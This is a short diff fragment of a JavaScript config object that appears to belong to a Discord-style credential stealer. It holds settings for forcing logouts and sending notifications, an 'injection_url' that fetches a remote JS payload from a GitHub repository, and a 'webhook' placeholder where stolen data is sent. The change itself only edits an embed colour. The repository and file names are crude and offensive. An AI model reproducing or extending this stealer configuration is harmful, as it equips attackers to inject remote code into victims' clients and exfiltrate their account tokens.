@@ -13,7 +13,7 @@ var config = {
     "logout": "true",
     "logout-notify": "true",
     "init-notify": "true",
-    "embed-color": 000000,
+    "embed-color": 0,
 
     injection_url: "https://raw.githubusercontent.com/EyeLoveBigBlackHawks/donotrun/main/.github/lgbt-to-the-ground.js",
     webhook: "%WEBHOOK%",
